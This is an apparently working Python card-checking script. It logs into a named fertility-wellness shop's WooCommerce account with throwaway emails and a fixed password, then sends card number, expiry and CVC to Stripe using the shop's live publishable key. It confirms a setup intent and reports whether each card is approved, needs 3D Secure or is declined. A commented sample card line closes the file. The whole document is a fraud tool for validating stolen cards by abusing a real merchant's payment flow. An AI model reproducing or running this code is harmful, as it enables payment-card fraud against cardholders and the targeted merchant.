
import requests
import re

import requests
import time
import re
import random

def st(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    
    email_list = [
        "cofedo8911@ahanim.com",
        "fexaw87614@ahanim.com",
        "bikota2853@ahanim.com",
       
    ]

    random_email = random.choice(email_list);       print(random_email)
    
    session = requests.Session()
    
    
    headers = {
    'authority': 'myfertilitywellness.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
    'cache-control': 'max-age=0',
    
    'referer': 'https://myfertilitywellness.com/my-account/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    response = session.get('https://myfertilitywellness.com/my-account/', headers=headers)


# Regular expression to find the nonce value
    match = re.search(r'name="woocommerce-login-nonce"\s+value="([^"]+)"', response.text)

    if match:
        nonce = match.group(1)
        print("Nonce found:", nonce)
    else:
        print("Nonce not found")
    
    


    headers = {
    'authority': 'myfertilitywellness.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    
    'origin': 'https://myfertilitywellness.com',
    'referer': 'https://myfertilitywellness.com/my-account/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    data = [
    ('username', random_email),
    ('password', 'xitioPass@1999'),
    ('woocommerce-login-nonce', '6b5e80ae92'),
    ('_wp_http_referer', '/my-account/'),
    ('login', 'Log in'),
    ('KZec-jAlayLqzT', 'NY0P]3WrpRDi'),
    ('KWlyDp_EU', 'UNbpD6'),
    ('_gbPaZc', 'mYMdTwUu9ZNsiGn'),
    ('KZec-jAlayLqzT', 'NY0P]3WrpRDi'),
    ('KWlyDp_EU', 'UNbpD6'),
    ('_gbPaZc', 'mYMdTwUu9ZNsiGn'),
]

    response = session.post('https://myfertilitywellness.com/my-account/', headers=headers, data=data)    





    headers = {
    'authority': 'myfertilitywellness.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
    
    'referer': 'https://myfertilitywellness.com/my-account/payment-methods/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    response = session.get('https://myfertilitywellness.com/my-account/add-payment-method/',  headers=headers)


# Use regex to extract the nonce
    match = re.search(r'"createAndConfirmSetupIntentNonce"\s*:\s*"([a-f0-9]+)"', response.text)

    if match:
        confirm_nonce = match.group(1)
        print("Confirm Nonce:", confirm_nonce)
    else:
        print("Nonce not found.")
    
    
    


    headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=IN&payment_user_agent=stripe.js%2Fc58b03fa81%3B+stripe-js-v3%2Fc58b03fa81%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fmyfertilitywellness.com&time_on_page=23583&client_attribution_metadata[client_session_id]=3f12aa88-5db2-4257-ab93-20cd8fb2c659&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=8d35640a-1229-4f03-901f-c632282e6728&guid=8679103b-45ca-4667-8cb3-9e30fef2d54c7dc798&muid=c15c2fc1-7ee6-4b41-b92f-d1cc4136552c2be351&sid=747eeeba-faee-42b5-b9ce-2d0a021e6f605f3dc3&key=pk_live_51IK4rbCEay2nFZeA7naIbXV6EhlInlIlJqcQ4gHZpN7sAXzjmJxsxlf9w3vJrrVlkvym8sLTMqWErvOhSG3mvQPH00pdNWimdp&_stripe_version=2024-06-20'

    response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

        
    #print(response.text)
    response_data = response.json()  # Parse the response as JSON

    if 'error' in response_data:
        error_code = response_data['error']['code']
        if error_code == 'incorrect_number':
            return "Card number invalid"
        elif error_code == 'invalid_expiry_year':
            return "card expire date dekh"
        else:
            print("An error occurred:", response_data['error']['message'])
            return response_data['error']['message']
    else:
        
        response_json = response.json()
        id = response_json.get('id', 'No id found')
        print(f"Payment source created successfully. ID: {id}") 
        time.sleep(1)
            
            
            
            

    headers = {
    'authority': 'myfertilitywellness.com',
    'accept': '*/*',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    
    'origin': 'https://myfertilitywellness.com',
    'referer': 'https://myfertilitywellness.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    params = {
    'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
}

    data = {
    'action': 'create_and_confirm_setup_intent',
    'wc-stripe-payment-method': id,
    'wc-stripe-payment-type': 'card',
    '_ajax_nonce': confirm_nonce,
}

    response = session.post('https://myfertilitywellness.com/', params=params,  headers=headers, data=data)            



    data = response.json()
    main_data = data.get('data', {})
    status = main_data.get('status')

    if data.get('success') == True and status == 'succeeded':
      #  print("Approved")
        return "Approved"
    elif data.get('success') == True and status == 'requires_action':
       # print("3D Required")
        return "3D Required"
    else:
        message = data.get("data", {}).get("error", {}).get("message", "")
        if "declined" in message.lower():
          #  print("Card was Declined")
            return "Card was Declined"
        else:
          #  print("Message:", message)
            return message

    
#print(st("4258810718226890|02|2027|653"))        
